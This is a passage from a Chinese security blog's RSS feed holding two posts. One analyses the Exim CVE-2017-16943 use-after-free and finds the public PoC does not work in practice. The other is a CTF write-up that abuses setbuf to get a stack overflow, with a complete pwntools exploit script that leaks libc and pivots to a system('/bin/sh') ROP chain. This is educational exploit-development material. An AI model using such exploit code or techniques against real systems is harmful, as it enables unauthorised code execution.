0)</div><div class="line">  &#123;</div><div class="line">  int c = *t++;</div><div class="line">  if (!mac_isprint(c) || (!allow_tab &amp;&amp; c == &apos;\t&apos;)) nonprintcount++;</div><div class="line">  length++;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">if (nonprintcount == 0) return s;</div><div class="line"></div><div class="line">/* Get a new block of store guaranteed big enough to hold the</div><div class="line">expanded string. */</div><div class="line"></div><div class="line">ss = store_get(length + nonprintcount * 3 + 1);</div><div class="line"></div><div class="line">/* Copy everything, escaping non printers. */</div><div class="line"></div><div class="line">t = s;</div><div class="line">tt = ss;</div><div class="line"></div><div class="line">while (*t != 0)</div><div class="line">  &#123;</div><div class="line">  int c = *t;</div><div class="line">  if (mac_isprint(c) &amp;&amp; (allow_tab || c != &apos;\t&apos;)) *tt++ = *t++; else</div><div class="line">    &#123;</div><div class="line">    *tt++ = &apos;\\&apos;;</div><div class="line">    switch (*t)</div><div class="line">      &#123;</div><div class="line">      case &apos;\n&apos;: *tt++ = &apos;n&apos;; break;</div><div class="line">      case &apos;\r&apos;: *tt++ = &apos;r&apos;; break;</div><div class="line">      case &apos;\b&apos;: *tt++ = &apos;b&apos;; break;</div><div class="line">      case &apos;\v&apos;: *tt++ = &apos;v&apos;; break;</div><div class="line">      case &apos;\f&apos;: *tt++ = &apos;f&apos;; break;</div><div class="line">      case &apos;\t&apos;: *tt++ = &apos;t&apos;; break;</div><div class="line">      default: sprintf(CS tt, &quot;%03o&quot;, *t); tt += 3; break;</div><div class="line">      &#125;</div><div class="line">    t++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">*tt = 0;</div><div class="line">return ss;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在<code>string_printing2</code>函数中，用到<code>store_get</code>, 长度为<code>length + nonprintcount * 3 + 1</code>，比如<code>BDAT \x7F</code>这句命令，就是<code>6+1*3+1 =&gt; 0x0a</code>，我们继续跟踪store中的全局变量，因为<code>0xa &lt; yield_length</code>，所以直接使用的Exim的堆分配，不会用到malloc，只有当上一次malloc 0x2000的内存用完或不够用时，才会再进行malloc</p>
<ul>
<li>0xa 对齐-&gt; 0x10</li>
<li>return next_yield = heap1+0x110</li>
<li>next_yield = heap1+0x120</li>
<li>yield_length = 0x1f00 - 0x10 = 0x1ef0</li>
</ul>
<h3 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h3><p>就是PoC中的发送大量数据去触发UAF：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s = &apos;a&apos;*6 + p64(0xdeadbeef)*(0x1e00/8)</div><div class="line">r.send(s+ &apos;:\r\n&apos;)</div></pre></td></tr></table></figure>
<p>再回到<code>receive.c</code>文件中，读取用户输入的是1788行的循环，然后根据meh所说，UAF的触发点是下面这几行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">if (ptr &gt;= header_size - 4)</div><div class="line">    &#123;</div><div class="line">    int oldsize = header_size;</div><div class="line">    /* header_size += 256; */</div><div class="line">    header_size *= 2;</div><div class="line">    if (!store_extend(next-&gt;text, oldsize, header_size))</div><div class="line">      &#123;</div><div class="line">      uschar *newtext = store_get(header_size);</div><div class="line">      memcpy(newtext, next-&gt;text, ptr);</div><div class="line">      store_release(next-&gt;text);</div><div class="line">      next-&gt;text = newtext;</div><div class="line">      &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>当输入的数据大于等于<code>0x100-4</code>时，会触发<code>store_extend</code>函数，<code>next-&gt;text</code>的值上面提了，是<code>heap1+0x10</code>，<code>oldsize=0x100, header_size = 0x100*2 = 0x200</code></p>
<p>然后在<code>store_extend</code>中，有这几行判断代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||</div><div class="line">    inc &gt; yield_length[store_pool] + rounded_oldsize - oldsize)</div><div class="line">  return FALSE;</div></pre></td></tr></table></figure>
<p>其中<code>next_yield = heap1+0x120</code>, <code>ptr + 0x100 = heap1+0x110</code></p>
<p>因为判断的条件为true，所以<code>store_extend</code>返回False</p>
<p>这是因为在之前<code>string_printing</code>函数中中分配了一段内存，所以在<code>receive_msg</code>中导致堆不平衡了，</p>
<p>随后进入分支会修补这种不平衡，执行<code>store_get(0x200)</code></p>
<ul>
<li>return next_yield = heap1+0x120</li>
<li>next_yield = heap1+0x320</li>
<li>yield_length = 0x1ef0 - 0x200 = 0x1cf0</li>
</ul>
<p>然后把用户输入的数据复制到新的堆中</p>
<p>随后执行<code>store_release</code>函数，问题就在这里了，之前申请的0x2000的堆还剩0x1cf0，并没有用完，但是却对其执行glibc的free操作，但是之后这个free后的堆却仍然可以使用，这就是我们所知的UAF, 释放后重用漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for (b = chainbase[store_pool]; b != NULL; b = b-&gt;next)</div><div class="line">  &#123;</div><div class="line">  storeblock *bb = b-&gt;next;</div><div class="line">  if (bb != NULL &amp;&amp; CS block == CS bb + ALIGNED_SIZEOF_STOREBLOCK)</div><div class="line">    &#123;</div><div class="line">    b-&gt;next = bb-&gt;next;</div><div class="line">    .......</div><div class="line">    free(bb);</div><div class="line">    return;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>其中，<code>bb = chainbase-&gt;next = heap1</code>, 而且<code>next-&gt;text == bb + 0x10</code></p>
<p>所以能成功执行<code>free(bb)</code></p>
<p>因为输入了大量的数据，所以随后还会执行：</p>
<ul>
<li>store_extend(next-&gt;text, 0x200, 0x400)</li>
<li>store_extend(next-&gt;text, 0x400, 0x800)</li>
<li>store_extend(next-&gt;text, 0x800, 0x1000)</li>
</ul>
<p>但是这些都不能满足判断：<code>if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) || inc &gt; yield_length[store_pool] + rounded_oldsize - oldsize)</code></p>
<p>所以都是返回true，不会进入到下面分支</p>
<p>但是到<code>store_extend(next-&gt;text, 0x1000, 0x2000)</code>的时候，因为满足了第二个判断<code>0x2000-0x1000 &gt; yield_length[store_pool]</code>, 所以又一次返回了False</p>
<p>所以再一次进入分支，调用<code>store_get(0x2000)</code></p>
<p>因为<code>0x2000 &gt; yield_length</code>所以进入该分支：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">if (size &gt; yield_length[store_pool])</div><div class="line">  &#123;</div><div class="line">  int length = (size &lt;= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE : size;</div><div class="line">  int mlength = length + ALIGNED_SIZEOF_STOREBLOCK;</div><div class="line">  storeblock * newblock = NULL;</div><div class="line"></div><div class="line">  if (  (newblock = current_block[store_pool])</div><div class="line">     &amp;&amp; (newblock = newblock-&gt;next)</div><div class="line">     &amp;&amp; newblock-&gt;length &lt; length</div><div class="line">     )</div><div class="line">    &#123;</div><div class="line">    /* Give up on this block, because it&apos;s too small */</div><div class="line">    store_free(newblock);</div><div class="line">    newblock = NULL;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  if (!newblock)</div><div class="line">    &#123;</div><div class="line">    pool_malloc += mlength;           /* Used in pools */</div><div class="line">    nonpool_malloc -= mlength;        /* Exclude from overall total */</div><div class="line">    newblock = store_malloc(mlength);</div><div class="line">    newblock-&gt;next = NULL;</div><div class="line">    newblock-&gt;length = length;</div><div class="line">    if (!chainbase[store_pool])</div><div class="line">      chainbase[store_pool] = newblock;</div><div class="line">    else</div><div class="line">      current_block[store_pool]-&gt;next = newblock;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  current_block[store_pool] = newblock;</div><div class="line">  yield_length[store_pool] = newblock-&gt;length;</div><div class="line">  next_yield[store_pool] =</div><div class="line">    (void *)(CS current_block[store_pool] + ALIGNED_SIZEOF_STOREBLOCK);</div><div class="line">  (void) VALGRIND_MAKE_MEM_NOACCESS(next_yield[store_pool], yield_length[store_pool]);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>这里就是该漏洞的关键利用点</p>
<p>首先：<code>newblock = current_block = heap1</code></p>
<p>然后：<code>newblock = newblock-&gt;next</code></p>
<p>我猜测的meh的情况和我加了<code>printf</code>进行测试的情况是一样的，在<code>printf</code>中需要malloc一块堆用来当做缓冲区，所以在heap1下面又多了一块堆，在free了heap1后，heap1被放入了unsortbin，fd和bk指向了arena</p>
<p>所以这个时候，<code>heap1-&gt;next = fd = arena_top</code></p>
<p>之后的流程就是：</p>
<ul>
<li>current_block = arena_top</li>
<li>next_yield = arena_top+0x10</li>
<li>return next_yield = arena_top+0x10</li>
<li>next_yield = arena_top+0x2010</li>
</ul>
<p>在执行完<code>store_get</code>后就是执行<code>memcpy</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memcpy(newtext, next-&gt;text, ptr);</div></pre></td></tr></table></figure>
<p>上面的<code>newtext</code>就是<code>store_get</code>返回的值<code>arena_top+0x10</code></p>
<p>把用户输入的数据copy到了arena中，最后达到了控制<code>RIP=0xdeadbeef</code>造成crash的效果</p>
<p>但是实际情况就不一样了，因为没有printf，所以heap1是最后一块堆，再free之后，就会合并到top_chunk中，fd和bk字段不会被修改，在释放前，这两个字段也是用来储存storeblock结构体的next和length，所以也是没法控制的</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2017-16943的确是一个UAF漏洞，但是在我的研究中却发现没法利用meh提供的PoC造成crash的效果</p>
<p>之后我也尝试其他利用方法，但是却没找到合适的利用链</p>
<p>发现由于Exim自己实现了一个堆管理，所以在heap1之后利用<code>store_get</code>再malloc一块堆是不行的因为current_block也会被修改为指向最新的堆块，所以必须要能在不使用<code>store_get</code>的情况下，malloc一块堆，才能成功利用控制RIP，因为exim自己实现了堆管理，所以都是使用<code>store_get</code>来获取内存，这样就只能找<code>printf</code>这种有自己使用malloc的函数，但是我找到的这些函数再调用后都会退出<code>receive_msg</code>函数的循环，所以没办法构造成一个利用链</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ol>
<li><a href="https://github.com/Exim/exim.git" target="_blank" rel="external">Exim源码</a></li>
<li><a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">Bugzilla-2199</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/12/01/0x3E/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CTF PWN题之setbuf的利用</title>
      <link>http://0x48.pw/2017/11/11/0x3D/</link>
      <guid>http://0x48.pw/2017/11/11/0x3D/</guid>
      <pubDate>Sat, 11 Nov 2017 04:28:03 GMT</pubDate>
      <description>
      
        &lt;p&gt;朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>朋友让我一起看了一道32位的pwn题，好像是国外code blue 2017 ctf上的一道题，开始我感觉32位pwn的姿势我应该都会了吧，结果，又学到了新姿势……</p>
<a id="more"></a>
<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/CODE%20BLUE%20CTF%202017/Pwn</a></p>
<p>在拿到这题的时候，看了下是32位的，canary都没开，本以为是很简单的题</p>
<p>在<code>sub_8048ada</code>函数中发现了一个任意函数调用的漏洞，对于<code>filter</code>输入的数值只检测<code>v3&lt;=2</code>，而v3是int型，所以可以任意调用小于<code>0x804b048</code>的函数，但是参数却不能控制，第一个参数是<code>fopen(&quot;/dev/null&quot;)</code>调用返回的文件流，第二个参数是buf，第三个参数为长度</p>
<p>初次之外就找不到别的漏洞了，在参数无法控制的情况下，只能利用该bin中的本身函数，没有任何getshell的思路</p>
<p>然后在大佬的教导下，我第一次注意到了<code>setbuf</code>函数，大部分pwn题都会有这个函数，用来设置IO缓冲区的，第一个参数是文件流，第二个参数表示缓冲区，一般在pwn题中的用法是<code>setbuf(stdin, 0)</code>表示标准输入取消缓冲区。</p>
<p>仔细观察还会发现，stdin并不是0，而是在stdio库中设置的一个文件流，所以也是作用在stdio库中的函数，比如<code>gets</code>, <code>puts</code>, <code>fread</code>, <code>fwrite</code></p>
<p>比如，<code>gets</code>函数使用的就是stdin文件流，如果设置了<code>setbuf(stdin, buf)</code>，<code>gets</code>函数则会先从buf中获取输入，自己也可以写个简单的代码测试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</div><div class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">10</span>);</div><div class="line">	buf[<span class="number">0</span>] = <span class="string">'1'</span>;</div><div class="line">	<span class="built_in">printf</span>(buf);</div><div class="line">	setbuf(<span class="built_in">stdout</span>, buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"test"</span>);</div><div class="line">	write(<span class="number">1</span>, <span class="string">"\n====\n"</span>,<span class="number">6</span>);</div><div class="line">	write(<span class="number">1</span>, buf, <span class="number">10</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后运行一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./a.out</span></div><div class="line">1</div><div class="line">====</div><div class="line">test</div></pre></td></tr></table></figure>
<p>可以从结果看出，printf根本没有输出<code>test</code>，而是把这个字符串输出到buf缓冲区中了，从而修改了buf中的内容。</p>
<p>因为设置的是stdout的缓冲区，而stdout是stdio库中的文件流，所以write并没有受到影响</p>
<p>还有一个问题，<code>setbuf</code>并没有设置长度的参数，设置长度的需要使用<code>setvbuf</code>，所以默认情况下setbuf设置的缓冲区长度为默认的4096，这样在该题中就形成了一个攻击链</p>
<p>控制程序跳转到<code>setbuf</code>函数，简单的讲就是调用<code>setbuf(fd=fopen(&quot;/dev/null&quot;), buf1)</code>，然后在<code>sub_8048742(no_filter)</code>函数中调用了<code>fwrite(fd, 0, buf2, len)</code>，这样就能往buf1中写buf2的数据，而buf是存在栈中的，所以可以造成栈溢出，能栈溢出了，下面就是找ROP链了</p>
<p>栈溢出构造逻辑：</p>
<p>add(rop) -&gt; add(buf1) -&gt; buf(buf2) -&gt; add(buf3) -&gt; add(buf4) -&gt; setbuf(fd, buf4) -&gt; post(buf1) -&gt; post(rop) -&gt; 栈溢出，利用ROP链</p>
<p>下面就是研究怎么构造ROP，我的思路是：</p>
<p>利用printf泄露libc地址 -&gt; 算出system，字符串<code>/bin/sh</code>地址 -&gt; 构造出第二个system(“/bin/sh”)的ROP链 -&gt; 通过fread写入.bss段 -&gt; 利用ROP把栈修改成.bss段 -&gt; 执行第二个ROP system(“/bin/sh”)</p>
<p>同样也能利用one_gadget，payload下面会放，这里再讨论一个问题</p>
<p>我把栈地址修改成<code>0x804b100</code>,执行<code>system(&quot;/bin/sh&quot;)</code>是失败的，然后再和大佬的讨论中发现了几种可能，system需要获取系统的环境变量envp，通过看system的源代码，发现有一个全局指针变量<code>_environ</code>指向栈上的envp，如果这个值被覆盖成了一个无效的地址，system则无法执行。但是在该题中，我的第一个rop并不长，所以并没有覆盖掉envp，之后修改了栈地址，也不存在覆盖envp的情况。</p>
<p>然后还有第二种情况，system栈地址空间不足，程序的可读可写地址空间是从<code>0x804b000-0x804c000</code>，总长度为0x1000，然后我修改的栈地址为<code>0x804b100</code>，所以system可用的栈空间只有0x100，之后我把栈的地址修改成<code>0x804b700</code>后，就能成功执行<code>system(&quot;/bin/sh&quot;)</code>了</p>
<p>附上payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = "debug"</span></div><div class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, data)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"1"</span>)</div><div class="line">	p.readuntil(<span class="string">"contents: "</span>)</div><div class="line">	p.sendline(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(p, n, offset)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"3"</span>)</div><div class="line">	p.readuntil(<span class="string">"ID (0-4): "</span>)</div><div class="line">	p.sendline(str(n))</div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(str(offset))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(p)</span>:</span></div><div class="line">	p.readuntil(<span class="string">"&gt; "</span>)</div><div class="line">	p.sendline(<span class="string">"4"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p = process(<span class="string">"./mailer"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">	e = ELF(<span class="string">"./mailer"</span>)</div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line">	gadget1 = <span class="number">0x08048dab</span>   <span class="comment"># pop ebp ; ret</span></div><div class="line">	gadget2 = <span class="number">0x080485f8</span>   <span class="comment"># leave ; ret</span></div><div class="line">	gadget3 = <span class="number">0x08048495</span>   <span class="comment"># pop ebx ; ret</span></div><div class="line">	gadget4 = <span class="number">0x08048daa</span>   <span class="comment"># pop edi ; pop ebp ; ret</span></div><div class="line">	gadget5 = <span class="number">0x08048da9</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">	one_gadget_sh = <span class="number">0x56ff5</span></div><div class="line">	read_buf = <span class="number">0x080486D9</span></div><div class="line">	stdin_bss = <span class="number">0x804B060</span></div><div class="line">	bss_buf = <span class="number">0x804b700</span></div><div class="line">	rop1 = <span class="string">"a"</span>*<span class="number">0xd</span></div><div class="line">	rop1 += p32(e.symbols[<span class="string">"printf"</span>]) + p32(gadget3) + p32(e.got[<span class="string">"printf"</span>]) <span class="comment"># printf(&amp;printf)</span></div><div class="line">	rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(<span class="number">0x100</span>) <span class="comment"># fread(buf, 1, 0x100, stdin)</span></div><div class="line">	rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)</div><div class="line">	add(p, rop1)</div><div class="line">	add(p, <span class="string">"b"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"c"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"d"</span>*<span class="number">255</span>)</div><div class="line">	add(p, <span class="string">"e"</span>*<span class="number">255</span>)</div><div class="line">	post(p, <span class="number">4</span>, <span class="number">-15</span>)</div><div class="line">	post(p, <span class="number">1</span>, <span class="number">0</span>)</div><div class="line">	post(p, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">	quit(p)</div><div class="line">	p.readuntil(<span class="string">":)\n"</span>)</div><div class="line">	printf_got = u32(p.read(<span class="number">4</span>))</div><div class="line">	<span class="comment"># print hex(printf_got)</span></div><div class="line">	system_libc = libc.symbols[<span class="string">"system"</span>]</div><div class="line">	printf_libc = libc.symbols[<span class="string">"printf"</span>]</div><div class="line">	binsh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</div><div class="line">	system_add = printf_got - printf_libc + system_libc</div><div class="line">	binsh_add =  printf_got - printf_libc + binsh_libc</div><div class="line">	one_gadget = printf_got - printf_libc + <span class="number">0x3a838</span></div><div class="line">	<span class="comment">#rop2 = "aaaa" + p32(gadget5) + p32(binsh_add+one_gadget_sh) + "aaaa" + p32(bss_buf) + p32(one_gadget)</span></div><div class="line">	rop2 = <span class="string">"aaaa"</span> + p32(system_add) + p32(binsh_add) + p32(binsh_add)</div><div class="line">	p.sendline(rop2)</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/11/11/0x3D/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
